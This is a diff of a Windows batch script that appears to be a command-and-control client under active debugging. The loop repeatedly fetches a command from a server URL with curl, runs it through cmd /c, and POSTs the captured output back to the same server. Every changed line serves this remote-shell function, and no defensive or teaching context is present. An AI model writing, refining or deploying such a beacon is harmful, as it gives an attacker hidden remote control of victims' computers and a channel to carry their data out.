@@ -9,42 +9,43 @@ echo [*] URL: %URL%
 :loop
     ping -n 3 127.0.0.1 >nul
     
-    rem Get command from server
+    rem Save raw response for debugging
+    curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>nul
+    echo [DEBUG] Raw response:
+    type %TEMP%\c2_raw.txt
+    
+    rem Get FIRST non-empty line as command
     set CMD=
-    for /f "usebackq delims=" %%A in (`curl -s %URL% 2^>nul`) do set CMD=%%A
+    for /f "usebackq delims=" %%A in (`type %TEMP%\c2_raw.txt ^| findstr /v "^$"`) do (
+        if "!CMD!"=="" (
+            set CMD=%%A
+            echo [DEBUG] Got command: !CMD!
+            goto :got_command
+        )
+    )
+    goto loop
     
-    rem If no command, wait and try again
+:got_command
     if "!CMD!"=="" goto loop
-    
-    rem If command is "WAITING", skip it
     if "!CMD!"=="WAITING" goto loop
     
-    rem CRITICAL: Don't re-run the same command
     if "!CMD!"=="!LAST_CMD!" (
         echo [*] Skipping duplicate: !CMD!
         goto loop
     )
     
     set LAST_CMD=!CMD!
-    
     echo [*] Executing: !CMD!
     
-    rem Execute command and capture output
     set TEMPFILE=%TEMP%\c2_output.txt
     cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
     
-    rem Send output back as ONE request
     if exist "!TEMPFILE!" (
-        curl -X POST --data-binary @"!TEMPFILE!" %URL% 2>nul
+        curl -X POST --data-binary @"!TEMPFILE!" --max-time 10 %URL% 2>nul
         del "!TEMPFILE!" 2>nul
-    ) else (
-        curl -X POST -d "Command executed with no output" %URL% 2>nul
     )
     
-    rem Clear command so we don't accidentally re-use it
     set CMD=
-    
-    rem Wait for server to process before requesting next command
     timeout /t 2 /nobreak >nul
     
 goto loop
